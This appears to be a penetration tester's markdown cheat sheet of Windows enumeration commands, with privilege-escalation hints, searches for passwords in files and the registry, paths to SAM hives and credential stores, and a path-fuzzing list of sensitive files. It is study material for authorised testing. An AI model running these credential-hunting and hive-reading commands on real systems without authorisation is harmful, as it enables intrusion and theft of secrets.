
## ---------------------------------- WINDOWS ----------------------------------
```
&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&
&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&
&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&WINDOWS&
```
## ---------------------------------- WINDOWS ----------------------------------
## Windows Situational Awareness and Enumeration 
```powershell

whoami /all                                     # Windows enum Basics -Basics req - get all user info availuble to current user ( i think) and the name of the host which might tell us about its purpose.
    # If this has the `SeImpersonate` token you cna privesc with Jucy potato or PrintSpoofer.exe (https://github.com/itm4n/PrintSpoofer)
net accounts 						                        # Windows enum Basics req - Situational Awareness - Get eh account policy such as how many failed login attempts!! 
whoami /priv                                    # Windows enum Basics - If we see we have `SeImpersonatePrivilege`, means a **Potato style attack**
    # Next: look at other users and groups on the system. 

whoami /priv | findstr /i "SeBatchLoginRight"   # Windows enum Basics -  Means we could schedule a task to run a task to run as this user ( Reverse shell!)
net user            #  - [Docs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11))
Get-LocalUser                                   # Windows enum Basics -Basics req - Powershell comand - [Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) - <<< **Better cmd**
Get-LocalUser | ft Name,Enabled,LastLogon       # Windows enum Basics - See the users and when they last logged in
net localgroup                                  # Windows enum Basics - Basics req - or powershell `Get-LocalGroup` - [Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroup?view=powershell-5.1). 
query user                                      # Windows enum Basics - see who is logged on the the system. Could we do a `psexec` or `runas` as them??

hostname                                        # Windows enum Basics - Get the name of the computer
net users                                       # Windows enum Basics - Just gets the local users
net users /domain                               # Windows enum Basics - gets the user from the domain
net localgroup                                  # Windows enum Basics - get the local groups on the machine
net users /groups                               # Windows enum Basics - gets the groups of the DC (only from the domain) 
ipconfig                                        # Windows enum Basics - check for connected networks
ipconfig /all 					                        # Windows enum Basics -Basics req - Situational Awareness Look for services, other networks. Notice the DNS server, gateway, subnet mask, and MAC address. 
route print 						                        # Windows enum Basics -Basics req - Situational Awareness contains all routes of the system. We should always check the routing table on a target system to ensure we don't miss any information.
netstat -ano  					                        # Windows enum Basics - Situational Awareness (-a active, -n disable name resolution , -o PID)  # Windows enum Basics - Situational Awareness find out what is happening Locally. Might be different from outside the network

systeminfo 				                              # Windows enum Basics -Basics  Situational Awareness this shell command will give you , list of hot fixes, hostname , OS version, Processor, Memory , Timezone
# Windows enum Basics -Basics  Situational Awareness - Use the build number and review the existing versions [from this list](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions) 32 or a 64-bit system becomes relevant we cannot run a 64-bit application on a 32-bit system.


Get-LocalGroupMember                            # Windows enum Basics - Situational Awareness ; shows the members of the group
getuid 								                          # Windows enum Basics - Situational Awareness 
net users 							                        # Windows enum Basics - Situational Awareness Lists out user and groups
net user <USERNAME>			                        # Windows enum Basics - Situational Awareness - Lists info about a particular user
net group 							                        # Windows enum Basics - Situational Awareness - sometimes available


dir /s *.txt                                    # Windows enum Basics - Situational Awareness cmd Situational Awareness looking for particualr files
Get-ChildItem -Path C:\ -Include *build.ps1* -File -Recurse -ErrorAction SilentlyContinue  # Windows enum Basics - Situational Awareness Powershel Situational Awareness looking for particualr files
Get-ChildItem -Path C:\Users\dave -Include *.txt ,*.doc, *.docx, *.xls, *.xlsx, *.pdf, -File -Recurse -ErrorAction SilentlyContinue      # Windows enum Basics req - Search for important files in the usres Location  

PS:> Get-ChildItem -Path C:\ -Filter *.kdbx" -Recurse -ErrorAction SilentlyContinue         # Windows enum Basics - Search for keepass database filkes
```


#### Windows Groups 

```
Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt                  # Windows Enum on groups - IF we are a member of Event Log Readers we should see what powershell commands have bee nrun especially and Base64 blobs - Offsec PG: Comprimised
```


```
Things in `C:\Program ` might be juicy                                              # Windows cmd file search - and also non system locations
C:> dir /s /b *.txt *.kdbx *.cred *.keychain *.key *.vnc *.pcap                     # Windows cmd file search - Password and Credential Files
C:> dir /s /b *.db *.sqlite *.bak *.backup *.sql *.mdb *.accdb                      # Windows cmd file search - Database and Backup files
C:> dir /s /b *.doc *.docx *.xls *.xlsx *.pdf *.ppt *.pptx                          # Windows cmd file search - Document and SPreadsheet
C:> dir /s /b *.conf *.cfg *.ini *.log *.xml *.yml *.yaml web.config app.config     # Windows cmd file search - Config and logs
C:> dir /s /b *.pem *.key *.pfx *.p12 *.csr *.der id_rsa id_dsa                     # Windows cmd file search - Key and Cert files
C:> dir /s /b *.ps1 *.bat *.cmd *.sh *.plist                                        # Windows cmd file search - System Specific Scripting 
```

#### Windows Interesting Files

```sh
# System Configuration and Logs - Interesting Windows Files
c:\windows\system32\eula.txt                             # Windows Interesting Files - End User License file; verify OS version
c:\windows\system32\license.rtf                          # Windows Interesting Files - License file; check OS version/year
c:\windows\System32\config                               # Windows Interesting Files - Critical config; may need admin access
c:\windows\debug\NetSetup.log                            # Windows Interesting Files - Logs install details; potential user info
c:\Windows\SoftwareDistribution\Download                 # Windows Interesting Files - Windows Update storage; check for updates
c:\Windows\WindowsUpdate.log                             # Windows Interesting Files - Check patch level for specific vulnerabilities
c:\WINDOWS\win.ini                                       # Windows Interesting Files - Legacy Windows settings; might hold creds
c:\WINNT\win.ini                                         # Windows Interesting Files - Same as above, but for older systems
C:\Windows\system32\drivers\etc\hosts                    # Windows Interesting Files - Hosts file on Windows is the Windows equivalent to `/etc/hosts` on Linux.
C:\Windows\system32\drivers\etc\services                 # Windows Interesting Files - Lists services and port mappings
C:\Users\Bobby\.ssh\id_rsa                               # Windows Interesting Files - If it has ssh running remember to check for keys 

# Automated Installation Logs - Interesting Windows Files
c:\windows\Panther\Unattend\Unattended.xml               # Windows Interesting Files - Logs for automated installs; useful metadata
c:\windows\Panther\Unattend\Unattend.txt                 # Windows Interesting Files - Same as above, in text format
c:\windows\Panther\Unattended.xml                        # Windows Interesting Files - Same directory; check for credentials

# IIS and Web-Related Files - Interesting Windows Files
c:\inetpub\wwwroot                                       # Windows Interesting Files - IIS default web directory; possible web files
c:\inetpub\wwwroot\web.config                            # Windows Interesting Files - Web app config; could contain database creds
C:\inetpub\wwwroot\appsettings.json                      # Windows Interesting Files - Typical ASP.NET Core config; often contains connection strings
C:\inetpub\wwwroot\appsettings.Development.json          # Windows Interesting Files - Dev config; frequently contains plaintext secrets
C:\inetpub\wwwroot\appsettings.Production.json           # Windows Interesting Files - Production config overrides
C:\inetpub\wwwroot\Properties\launchSettings.json        # Windows Interesting Files - Dev launch config; may leak environment vars
C:\inetpub\wwwroot\bin\                                  # Windows Interesting Files - Compiled binaries and possible .pdb debug files
C:\inetpub\wwwroot\wwwroot\                              # Windows Interesting Files - Nested static content directory (ASP.NET Core)
c:\inetpub\logs\LogFiles                                 # Windows Interesting Files - IIS logs; trace user activity or errors
C:\inetpub\history\                                      # Windows Interesting Files - Backup IIS configs; may contain old secrets
C:\Windows\System32\inetsrv\config\applicationHost.config # Windows Interesting Files - IIS main config; site bindings & app pool identities

# Password Hashes and Registry Hives - Interesting Windows Files
c:\WINDOWS\Repair\SAM                                    # Windows Interesting Files - SAM registry hive; holds user hashes
c:\WINDOWS\Repair\system                                 # Windows Interesting Files - System registry hive; works with SAM
c:\WINDOWS\Repair\security                               # Windows Interesting Files - Security registry hive; sensitive details
pwdump SAM system                                        # Windows Interesting Files - Dump password hashes from SAM and system

# User Secrets and Credential Storage - Interesting Windows Files
C:\Users\<user>\AppData\Roaming\Microsoft\UserSecrets\   # Windows Interesting Files - ASP.NET Core user secrets (dev environments)
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\   # Windows Interesting Files - Stored credentials
C:\Users\<user>\AppData\Local\Microsoft\Vault\           # Windows Interesting Files - Windows Vault credentials
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\         # Windows Interesting Files - Machine-level private keys

# Event Logs - Interesting Windows Files
C:\Windows\System32\winevt\Logs\                         # Windows Interesting Files - Windows Event Logs (.evtx files)

# Common User Directories - Interesting Windows Files
C:\Users\<user>\Desktop\                                 # Windows Interesting Files - CTFs often leave creds or notes here
C:\Users\<user>\Documents\                               # Windows Interesting Files - Possible stored credentials or notes
C:\Users\<user>\Downloads\                               # Windows Interesting Files - May contain scripts or installers

# PHP and Apache Configuration - Interesting Windows Files
c:\WINDOWS\php.ini                                       # Windows Interesting Files - PHP config; useful for debugging setups
c:\WINNT\php.ini                                         # Windows Interesting Files - Same as above, for older Windows systems
c:\Program Files\Apache Group\Apache\conf\httpd.conf     # Windows Interesting Files - Apache config; useful for web server analysis
c:\Program Files\Apache Group\Apache2\conf\httpd.conf    # Windows Interesting Files - Same as above, for newer Apache versions
c:\Program Files\xampp\apache\conf\httpd.conf            # Windows Interesting Files - XAMPP Apache config; check for vulnerabilities
c:\php\php.ini                                           # Windows Interesting Files - PHP config; may contain sensitive details
c:\php5\php.ini                                          # Windows Interesting Files - Same, for older PHP installations
c:\php4\php.ini                                          # Windows Interesting Files - Legacy PHP config file
c:\apache\php\php.ini                                    # Windows Interesting Files - PHP settings within Apache installations
c:\xampp\apache\bin\php.ini                              # Windows Interesting Files - PHP config within XAMPP
c:\home2\bin\stable\apache\php.ini                       # Windows Interesting Files - Alternate PHP directory; check for configs
c:\home\bin\stable\apache\php.ini                        # Windows Interesting Files - Alternate PHP directory; check for configs
c:\windows\temp\sess_923nktm0vmmi12qrptls332t5o           # Windows Interesting Files - PHP session data stored in windows/temp

# Nginx (Windows Installations) - Interesting Windows Files
C:\nginx\conf\nginx.conf                                 # Windows Interesting Files - Nginx configuration file
C:\ProgramData\nginx\conf\nginx.conf                     # Windows Interesting Files - Alternate nginx config location

```

Fuzz List

```
Users/Administrator/NTUser.dat
Documents and Settings/Administrator/NTUser.dat
apache/logs/access.log
apache/logs/error.log
apache/php/php.ini
boot.ini
inetpub/wwwroot/global.asa
inetpub/wwwroot/appsettings.json
MySQL/data/hostname.err
MySQL/data/mysql.err
MySQL/data/mysql.log
MySQL/my.cnf
MySQL/my.ini
php4/php.ini
php5/php.ini
php/php.ini
Program Files/Apache Group/Apache2/conf/httpd.conf
Program Files/Apache Group/Apache/conf/httpd.conf
Program Files/Apache Group/Apache/logs/access.log
Program Files/Apache Group/Apache/logs/error.log
Program Files/FileZilla Server/FileZilla Server.xml
Program Files/MySQL/data/hostname.err
Program Files/MySQL/data/mysql-bin.log
Program Files/MySQL/data/mysql.err
Program Files/MySQL/data/mysql.log
Program Files/MySQL/my.ini
Program Files/MySQL/my.cnf
Program Files/MySQL/MySQL Server 5.0/data/hostname.err
Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
Program Files/MySQL/MySQL Server 5.0/data/mysql.err
Program Files/MySQL/MySQL Server 5.0/data/mysql.log
Program Files/MySQL/MySQL Server 5.0/my.cnf
Program Files/MySQL/MySQL Server 5.0/my.ini
Program Files/MySQL/MySQL Server 5.1/my.ini
Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
Program Files (x86)/Apache Group/Apache/conf/httpd.conf
Program Files (x86)/Apache Group/Apache/conf/access.log
Program Files (x86)/Apache Group/Apache/conf/error.log
Program Files (x86)/FileZilla Server/FileZilla Server.xml
Program Files (x86)/xampp/apache/conf/httpd.conf
WINDOWS/php.ini
WINNT/php.ini
xampp/apache/bin/php.ini
WINDOWS/Repair/SAM
Windows/repair/system
Windows/repair/software
Windows/repair/security
Windows/system32/config/AppEvent.Evt
Windows/system32/config/SecEvent.Evt
Windows/system32/config/default.sav
Windows/system32/config/security.sav
Windows/system32/config/software.sav
Windows/system32/config/system.sav
Windows/system32/config/regback/default
Windows/system32/config/regback/sam
Windows/system32/config/regback/security
Windows/system32/config/regback/system
Windows/system32/config/regback/software
WINDOWS/System32/drivers/etc/hosts
Windows/win.ini
WINNT/win.ini
xampp/apache/logs/access.log
xampp/apache/logs/error.log
Windows/Panther/Unattend/Unattended.xml
Windows/Panther/Unattended.xml
Windows/debug/NetSetup.log
Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
Windows/System32/inetsrv/config/applicationHost.config
inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```


```sh
# Windows enum Basics - Situational Awareness - See local files commands
dir -force    																							   		 	# Windows enum Basics - Lists all files
gci -Hidden   																							 		 	# Windows enum Basics - Also Lists all files
 
# Windows enum Basics - Situational Awareness - Find all the files (eg log, txt files)
- Get-ChildItem -Path C:\ -Recurse -Filter *.log,*.txt -ErrorAction SilentlyContinue | Select-Object FullName    	# Windows enum Basics - Situational Awareness -  
Look in the downloads, Program files dirs, txt and other files  										 		 	                        # Windows enum Basics - Situational Awareness -  

# Windows enum Basics - Situational Awareness - See Recent Commands
Get-History                                                                                                        # Windows enum  Basics req - Get all the powershell commands run 
(Get-PSReadlineOption).HistorySavePath                                                                             # Windows enum  Basics req - Situational Awareness -  will get us the location of the file containing the history path. More verbose is Get-PSReadlineOption .    

# Windows enum Basics - Situational Awareness - Check 32-bit installed software
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname    # Windows enum Basics - Situational Awareness -  
Also: without the filter :  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"  # Windows enum Basics - Situational Awareness -  
# Windows enum Basics - Situational Awareness - Check 64-bit installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname        		    # Windows enum Basics - Situational Awareness -  
Also: without the filter   Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"   		    # Windows enum Basics - Situational Awareness - 

# Windows enum Basics - Situational Awareness - Check current running applications
- Get-Process                                                                                                       # Windows enum Basics - Situational Awareness - list all the running process
- Get the path location of a process by ID  (Get-Process -Id <PID>).path   											                    # Windows enum Basics - Situational Awareness -  
- tasklist 
- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   							            # Windows enum Basics - Situational Awareness -  
-  # Windows enum Basics - Situational Awareness -  Having AlwaysInstallElevated set to 1 is considered a significant security risk because any user, including those without administrative privileges, can install software that will run with elevated permissions. Malicious software packaged in an MSI file could be used to compromise the system.
-  # Windows enum Basics - Situational Awareness -  The command above is used in Windows Command Prompt to query the registry settings. It checks the configuration of the system related to the Windows Installer. Specifically, it checks whether the 'AlwaysInstallElevated' policy is set in the Windows registry.
- reg query   																										                                                  # Windows enum Basics - Situational Awareness -  : This is the command used to display the contents of the Windows registry or find all matches of a specified data type
- HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer   																# Windows enum Basics - Situational Awareness -  : This specifies the registry path. HKLM stands for HKEY_LOCAL_MACHINE, which contains settings that are general to all users on the computer. This particular path is where policies specific to the Windows Installer are stored.
- /v AlwaysInstallElevated :  																						# Windows enum Basics - Situational Awareness -   This specifies that we want to view the value of the 'AlwaysInstallElevated' registry entry
- Out put might look like :  HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer AlwaysInstallElevated    REG_DWORD    0x1   # Windows enum Basics - Situational Awareness -  
- get-applockerpolicy -effective | select -expandproperty rulecollections   										# Windows enum Basics - Situational Awareness -  
- ; run: 
(dir 2>&1 * |echo CMD);&<# rem #>echo PowerShell   																	            # Windows enum Basics - Situational Awareness -  Find out which kind of shell you have
	- URL encoded: (dir+2>%261+* |echo+CMD)%3b%26<%23+rem+%23>echo+PowerShell  										# Windows enum Basics - Situational Awareness -  


Check the downloads a, documents and all the obvious base , 32 system etc  # Windows enum Basics - Situational Awareness
```

```
reg query HKLM\SOFTWARE                 # Search for things (May be default passwords for for software install on the LOCAL MACHINE)
reg query HKCU\SOFTWARE                 # Search for things (May be default passwords for for software installed for the CURRENT USER)
reg query HKCU\SOFTWARE\ORL\WINVNC3     # Offsec Win Privesc Low hanigng Fruit
```

<details>
	<summary>Output Breakdown and Example </summary> 

```sh
PS C:\xampp\htdocs\passwordmanager> get-applockerpolicy -effective | select -expandproperty rulecollections
get-applockerpolicy -effective | select -expandproperty rulecollections


PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in 
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%OSDRIVE%\*}
PathExceptions      : {%OSDRIVE%\Administration\*}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 7eadbece-51d4-4c8b-9ab5-39faed1bd93e
Name                : %OSDRIVE%\*
Description         : 
UserOrGroupSid      : S-1-1-0
Action              : Deny

PathConditions      : {%OSDRIVE%\Administration\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
Name                : %OSDRIVE%\Administration\*
Description         : 
UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
Action              : Allow
``` 

`PublisherConditions`: Conditions based on the identity of the software's publisher. The syntax {*\*\*,0.0.0.0-*} represents a range of software from any publisher and any version. This is typically used in publisher rules to allow or deny applications based on their signed publisher certificate.

`PathConditions`: Specifies the file paths to which the rule applies. For example, {%WINDIR%\Installer\*} applies to all files in the Windows Installer directory within the Windows directory.

`HashExceptions`, PathExceptions, PublisherExceptions: These are exceptions to the rule based on file hashes, file paths, and software publishers, respectively. If a file matches an exception, the rule does not apply to it.

`Id`: A unique identifier for the rule.

`Name`: A descriptive name for the rule, such as “(Default Rule) All Windows Installer files”.

`Description`: Provides more details about what the rule does, such as “Allows members of the Everyone group to run digitally signed Windows Installer files.”

`UserOrGroupSid`: The security identifier (SID) for the user or group to whom the rule applies. For example, S-1-1-0 is the SID for the "Everyone" group, and S-1-5-32-544 represents the "Administrators" group.

`Action`: Specifies what action the policy takes when a rule is matched. “Allow” means the application is permitted to run, while “Deny” means it is blocked.

Here’s a brief explanation of each rule based on the output:

The first rule allows all users (“Everyone” group) to run any digitally signed Windows Installer files.
The second rule allows all users to run any Windows Installer files located in %systemdrive%\Windows\Installer.
The third rule allows members of the local Administrators group to run all Windows Installer files.
The fourth rule denies all users from running any files from any directory on the OS drive, except for a specified path.
The fifth rule specifically allows a user (indicated by the SID S-1-5-21-...) to run files in the %OSDRIVE%\Administration\ directory.



</details>
                                       

#### 64Bit or not with low auth via powershell??

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> [System.Environment]::Is64BitOperatingSystem
True
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> [System.Environment]::Is64BitProcess
True
```

## Windows enum Basics -

```
P:> Get-Command ping                                                            # Windows enum Basics - Is ping (tool) installed?
C:> where ping                                                                  # Windows enum Basics - Is ping (tool) installed?
C:> echo %CMDCMDLINE%                                                          # Windows enum Basics - Is this powershell or cmd?  
```

```
C:> dir /a:H                                                                    # Windows enum Basics - Show ONLY hidden files in the current dir ( Viz C:\ProgramData etc )
C:> dir /a                                                                      # Windows enum Basics - Show all files including hidden files in the current dir ( Viz C:\ProgramData etc )  
P'> Get-ChildItem -Force                                                        # Windows enum Basics - Show all the files in the cwd
P:> Get-ChildItem -Force -Recurse                                               # Windows enum Basics - Show all the files - NOISY!
C:> dir /a:H *.txt                                                              # Windows enum Basics - Show hidden txt files in the current dir
C:> dir C:\Users /A:H *.txt                                                     # Windows enum Basics - Show hidden txt files in the Users dir
C:> dir C:\Users\*.txt /a /s > hidden_txt_files.txt                             # Windows enum Basics - 
C:> dir C:\ /a /s                                                               # Windows enum Basics - Recusivly (sub dirs) Show all files including hidden files in the current dir
```
### Env Vars
``` 
P:> Get-ChildItem Env:                                                          # Windows enum Basics - Show all the environment variables
C:> set                                                                         # Windows enum Basics - typing "set" in cmd will show all the environment variables
C:> set PATH=%SystemRoot%\system32;%SystemRoot%;                                # Windows Fix a broken path - Offsec PG Jacko
```
#### Operating System (Windows enum)
```
C:> ver                                                                        # Windows enum Basics - Windows version
CP:> wmic os get osarchitecture                                                 # Windows enum Basics - OS architecture (e.g., 32-bit/64-bit)
P:> Get-CimInstance Win32_OperatingSystem | Select-Object OSArchitecture        # Windows enum Basics - OS architecture
C:> echo %PROCESSOR_ARCHITECTURE%                                               # Windows enum Basics - Get architecture (32-bit/64-bit) from env variable
CP:> wmic os get osarchitecture                                                  # Windows enum Basics - Get OS architecture (e.g., 32-bit/64-bit)
CP:> systeminfo | findstr /C:"System Type"                                       # Windows enum Basics - Retrieve architecture details from system info
P:> $env:PROCESSOR_ARCHITECTURE                                                 # Windows enum Basics - Get architecture from env variable
P:> Get-CimInstance Win32_OperatingSystem | Select-Object OSArchitecture        # Windows enum Basics - Get OS architecture via PowerShell
P:> [System.Environment]::Is64BitOperatingSystem                                # Windows enum Basics - Check if the OS is 64-bit (True/False)
CP:> dir "C:\Program Files (x86)"                                               # Windows enum Basics - Check for 64-bit OS by verifying (x86) folder presence

```
#### Hostname (Windows enum)
```
CP:> hostname                                                                   # Windows enum Basics - Get the system's hostname
CP:> whoami                                                                     # Windows enum Basics - Display the current user
P:> set computername                                                           # Windows enum Basics - Show or set the computer name
P:> [System.Net.Dns]::GetHostName()                                             # Windows enum Basics - Get hostname
P:> $env:COMPUTERNAME                                                           # Windows enum Basics - Environment variable for computer name
```
#### Network (Windows enum)
```
CP:> ipconfig                                                                   # Windows enum Basics - Basic network info of the system
CP:> ipconfig /all                                                              # Windows enum Basics - Detailed network config including DNS and DHCP
CP:> ipconfig /allcompartments /all                                             # Windows enum Basics - Network info across compartments
CP:> wmic nicconfig get description,IPAddress,MACaddress                        # Windows enum Basics - Show NIC, MAC, and IP details
CP:> route print                                                                # Windows enum Basics - Display the routing table
CP:> arp -a                                                                     # Windows enum Basics - List ARP cache (IP to MAC mappings)
CP:> netstat                                                                    # Windows enum Basics - Active connections summary
CP:> netstat -ano                                                               # Windows enum Basics - Connections with protocol, address, and PID
P:> Get-NetIPAddress                                                            # Windows enum Basics - Network adapter IPs
P:> Get-NetRoute                                                                # Windows enum Basics - Routing table
P:> Get-NetTCPConnection                                                        # Windows enum Basics - List active TCP connections
P:> Get-NetNeighbor                                                             # Windows enum Basics - Display ARP table
```
#### Firewall Configuration (Windows enum)
```
CP:> netsh advfirewall show currentprofile                                      # Windows enum Basics - Current firewall profile
CP:> netsh advfirewall firewall show rule name=all                              # Windows enum Basics - Show all firewall rules
CP:> netsh firewall show state                                                  # Windows enum Basics - Firewall state with active ports/services
P:> Get-NetFirewallProfile                                                      # Windows enum Basics - Current firewall profile
P:> Get-NetFirewallRule | Select-Object Name, Enabled, Direction                # Windows enum Basics - Firewall rules overview
```
#### Windows Defender (Windows enum)
```
CP:> sc query windefend                                                         # Windows enum Basics - Check Windows Defender service status
P:> Get-MpComputerStatus                                                        # Windows enum Basics - If "RealTimeProtectionEnabled" is set to True, Defender is enabled on the system.
P:> Get-Service -Name windefend                                                 # Windows enum Basics - Defender service details
```
#### Running Processes (Windows enum)
```
CP:> wmic service get Name,DisplayName,State,StartName,ProcessId                # Windows enum Basics - List running services and details
P:> Get-WmiObject Win32_Service | Select-Object Name, DisplayName, StartName, State, ProcessId       # Windows enum Basics - Running services
P:> Get-Process  # Windows enum Basics - List processes
```
Is the Machine on a Domain?
```
CP:> set userdomain                                                             # Windows enum Basics - Check if the machine is on a domain
P:> (Get-WmiObject Win32_ComputerSystem).PartOfDomain                           # Windows enum Basics - Check domain membership
P:> $env:USERDOMAIN                                                             # Windows enum Basics - Display user domain
```
#### More advanced Process and task comands
```
winget install --id Microsoft.Sysinternals --source winget              # Windows enum (Further) - Install sysinternals if needed
tasklist /?                                                             # Windows enum (Further) - Get usage on Tasklist cmd
tasklist | more                                                         # Windows enum (Further) - See detailed Task list data
tasklist /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"  # Windows enum (Further) - Look for admin related tasks
taskkill /?                                                             # Windows enum (Further) - Get info on killing tasks 
pslist /? -accepteula | more                                            # Windows enum (Further) - run pslist and accept the user agreement
pslist -d | more                                                        # Windows enum (Further) - Get info on Threads with -d
pslist -t | more                                                        # Windows enum (Further) - See relationships of process in Tree format
pssuspend chrome.exe                                                    # Windows enum (Further) - Suspend a process
pssuspend -r chrome.exe                                                 # Windows enum (Further) - Resume a Suspended process
listdlls -u | more                                                      # Windows enum (Further) - check which unsigned (-u) dlls are called by Proceess
```


#### Registry (Windows enum)
```
CP:> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"     # Windows enum Basics - Query Winlogon keys
CP:> reg query HKLM /f password /t REG_SZ /s                                    # Windows enum Basics - Search "password" in HKLM registry hive
CP:> reg query HKCU /f password /t REG_SZ /s                                    # Windows enum Basics - Search "password" in HKCU hive
CP:> reg query HKU /f password /t REG_SZ /s                                     # Windows enum Basics - Search "password" in all user profiles
CP:> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /s            # Windows enum Basics - Auto-start programs (HKLM)
CP:> reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /s            # Windows enum Basics - Auto-start programs (HKCU)
CP:> reg query HKCU\Software\Microsoft\Terminal Server Client /s                # Windows enum Basics - Check RDP connection history
P:> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # Windows enum Basics - Query Winlogon keys
P:> Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"  # Windows enum Basics - Query user startup items
```
#### Hardware (Windows enum)
```
CP:> wmic bios                                                                  # Windows enum Basics - Display BIOS information
CP:> wmic baseboard get manufacturer                                            # Windows enum Basics - Show motherboard manufacturer
CP:> wmic cpu list full                                                         # Windows enum Basics - Detailed CPU information
P:> Get-CimInstance Win32_BIOS                                                  # Windows enum Basics - BIOS information
P:> Get-CimInstance Win32_BaseBoard                                             # Windows enum Basics - Motherboard information
P:> Get-CimInstance Win32_Processor                                             # Windows enum Basics - CPU information
```
#### Installed Patches (Windows enum)
```
CP:> wmic qfe  # Windows enum Basics - List installed updates and hotfixes
C:> wmic qfe get Caption, Description, HotFixID, InstalledOn                   # Windows enum Basics - Detailed hotfix information
P:> Get-HotFix  # Windows enum Basics - List installed patches
```
#### Installed Applications (Windows enum)
```
CP:> wmic product get name, version, vendor                                     # Windows enum Basics - List installed apps with vendor and version
CP:> dir "C:\Program Files (x86)"                                               # Windows enum Basics - Look fi ther eare any interesting programs in her which might have CVEs and vulns??
```
#### Unquoted Service Paths (Windows enum)
```
CP:> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  # Windows enum Basics - Find unquoted service paths
```
#### Net Start (Windows enum)
```
CP:> net start  # Windows enum Basics - List running services
CP:> net start <service_name>                                                   # Windows enum Basics - Start a specific service
CP:> net stop <service_name>                                                    # Windows enum Basics - Stop a specific service
P:> Get-Service | Where-Object {$_.Status -eq "Running"}                        # Windows enum Basics - List running services
```
#### Device Drivers (Windows enum)
```
CP:> Driverquery  # Windows enum Basics - Display all device drivers
P:> Get-WmiObject Win32_SystemDriver | Select-Object Name, State, PathName      # Windows enum Basics - List drivers
```
#### Scheduled Tasks (Windows enum)
```
CP:> schtasks /query /fo LIST /v                                                # Windows enum Basics - List all scheduled tasks in verbose mode (Interested in: "TaskName", "Next Run Time", "Author", "Task To Run", "Run As User" )
P:> Get-ScheduledTask | Select-Object TaskName, State, Actions                  # Windows enum Basics - List scheduled tasks
```
#### Search for Cleartext Passwords (Windows enum)
```
CP:> findstr /si password *.txt                                                 # Windows enum Basics - Search "password" in .txt files
CP:> findstr /si password *.xml                                                 # Windows enum Basics - Search "password" in .xml files
CP:> findstr /si password *.ini                                                 # Windows enum Basics - Search "password" in .ini files
CP:> for /r C:\ %i in (*.txt *.xml *.ini) do findstr /si password "%i" 2>nul >> password_search_results.txt  # Windows enum Basics - Recursive password search in files
P:> Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini | Select-String -Pattern "password"  # Windows enum Basics - Search files for "password"

Can also search for "ConvertTo-SecureString" in files                           # Windows enum Basics - Search "password" and credentials in files
```
#### Search for Strings in Config Files (Windows enum)
```
CP:> dir /s *pass* == *cred* == *vnc* == *.config*                              # Windows enum Basics - Search for potential password-related strings
```
#### Find All Passwords in All Files (Windows enum)
```
CP:> findstr /spin "password" *.*                                               # Windows enum Basics - Search "password" in all files recursively
```

```
P:> Get-FileHash -Path "C:\path\to\your\file.txt" -Algorithm MD5                # Windows enum Basics - Get the md5 chck sum of a file  
